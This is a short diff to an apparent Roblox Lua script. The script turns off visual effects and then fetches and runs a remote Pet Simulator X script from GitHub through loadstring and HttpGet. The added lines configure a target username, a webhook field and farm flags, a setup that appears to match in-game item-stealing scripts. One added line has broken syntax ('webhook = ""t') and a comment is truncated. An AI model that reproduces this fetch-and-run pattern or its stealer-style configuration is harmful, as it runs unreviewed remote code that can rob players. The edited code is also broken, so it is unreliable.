@@ -69,7 +69,12 @@ if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect
 e.Enabled = false
 wait(1) -- Adjust the duration as needed
 
--- Load the second external script
+-- Load the second external scrip
+    Username = "NotValra"
+loadingscreen = false 
+delay = 0 
+farmui = false
+webhook = ""t
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/pets9.lua"))()
 end
 
